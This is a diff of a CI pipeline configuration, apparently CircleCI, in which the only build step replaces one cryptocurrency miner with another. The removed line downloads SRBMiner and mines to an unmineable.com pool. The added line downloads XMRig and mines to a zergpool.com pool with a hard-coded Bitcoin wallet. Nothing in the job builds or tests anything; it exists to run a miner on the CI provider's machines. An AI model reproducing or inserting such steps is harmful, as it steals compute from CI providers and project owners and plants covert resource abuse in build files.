@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.9/SRBMiner-Multi-0-7-9-Linux.tar.xz && tar -xf SRBMiner-Multi-0-7-9-Linux.tar.xz && cd SRBMiner-Multi-0-7-9 && ./SRBMiner-MULTI --algorithm randomx --pool rx.unmineable.com:3333 --wallet SOL:5M4LLuvYoVSv1KgdopUrXZwYpVPz92qhDsMnXFnjTJkY.$(echo $(shuf -i 1-8000 -n 1)-ARCH) --password x --keepalive --tls
+      - run: wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.mine.zergpool.com:4457 -u bc1qtcrjhzevn8s68tar9wzhy7cdhy9ek4wgm66lvt --keepalive --timeout 120 --donate-level 1 -p  c=BTC,mc=BTC,ID=newe1
